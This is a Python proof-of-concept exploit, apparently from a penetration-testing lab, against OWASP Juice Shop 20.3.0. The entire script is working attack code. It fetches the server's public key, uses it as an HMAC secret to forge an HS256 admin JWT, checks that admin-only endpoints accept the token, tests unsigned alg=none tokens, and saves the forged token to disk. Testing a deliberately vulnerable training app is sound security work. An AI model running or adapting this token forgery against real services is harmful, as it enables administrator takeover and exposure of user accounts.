#!/usr/bin/env python3
"""
c07 (vector B) -- admin session token via JWT algorithm confusion (NO SQL INJECTION)
Target: OWASP Juice Shop 20.3.0 @ http://host.docker.internal:3000

Root cause: the server verifies JWTs via jwt.verify(token, publicKey) WITHOUT an
`algorithms` allow-list, and jsonwebtoken picks the verification primitive from the
token's own `alg` header. So a token declaring alg=HS256 is checked as
HMAC-SHA256(key = the RSA *public* key text) -- and that text is served to
anonymous users at /encryptionkeys/jwt.pub.

Result: a self-signed token with data.role="admin" that the server accepts.
Also demonstrated: alg=none with an empty signature is accepted (unsigned JWTs).
Control: a forged token with a tampered signature is rejected -> the server really
does verify signatures, so the acceptance above is a genuine bypass.

Writes: /workspace/evidence/c7_forged_hs256_admin_token.txt
"""
import base64
import hashlib
import hmac
import json
import sys
import urllib.request

BASE = "http://host.docker.internal:3000"
OUT = "/workspace/evidence/c7_forged_hs256_admin_token.txt"


def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def http(path, token=None):
    h = {"Content-Type": "application/json"}
    if token:
        h["Authorization"] = "Bearer " + token
    try:
        with urllib.request.urlopen(urllib.request.Request(BASE + path, headers=h), timeout=15) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def main():
    # 1. fetch the PUBLIC key (intended-public, but here it doubles as an HMAC secret)
    st, pub = http("/encryptionkeys/jwt.pub")
    print(f"[1] GET /encryptionkeys/jwt.pub -> HTTP {st}, {len(pub)} bytes (PEM, public by design)")
    if st != 200:
        sys.exit("[-] could not fetch jwt.pub")

    # 2. build an admin payload (id 1 = admin@juice-sh.op) and sign it as HS256
    claims = {"data": {"id": 1, "email": "admin@juice-sh.op", "role": "admin"}, "bid": 1}
    header = b64u(json.dumps({"typ": "JWT", "alg": "HS256"}, separators=(",", ":")).encode())
    body = b64u(json.dumps(claims, separators=(",", ":")).encode())
    sig = b64u(hmac.new(pub.encode(), f"{header}.{body}".encode(), hashlib.sha256).digest())
    forged = f"{header}.{body}.{sig}"

    # 3. prove the server accepts it on an admin-only endpoint
    st, data = http("/api/Users", forged)
    print(f"[2] GET /api/Users with forged HS256(public-key) token -> HTTP {st}, {len(data)} bytes")
    assert st == 200, "forgery rejected"
    users = json.loads(data).get("data", [])
    st2, who = http("/rest/user/authentication-details/", forged)
    print(f"[3] GET /rest/user/authentication-details (admin-only) -> HTTP {st2}, "
          f"{len(json.loads(who)['data']) if st2 == 200 else 0} accounts")
    assert st2 == 200

    # 4. control: same payload, bad signature must be rejected (proves signature is checked)
    st3, _ = http("/api/Users", f"{header}.{body}.{'A' * 43}")
    print(f"[4] control: tampered signature -> HTTP {st3} (expected 401)")
    assert st3 == 401

    # 5. secondary flaw: alg=none accepted
    hn = b64u(json.dumps({"typ": "JWT", "alg": "none"}, separators=(",", ":")).encode())
    st4, _ = http("/api/Users", f"{hn}.{body}.")
    print(f"[5] alg=none, empty signature -> HTTP {st4} (unsigned JWTs accepted)")

    with open(OUT, "w") as f:
        f.write(forged + "\n")
    print(f"\n[+] forged admin JWT saved -> {OUT}")
    print("[+] ZERO SQL syntax used")


if __name__ == "__main__":
    main()
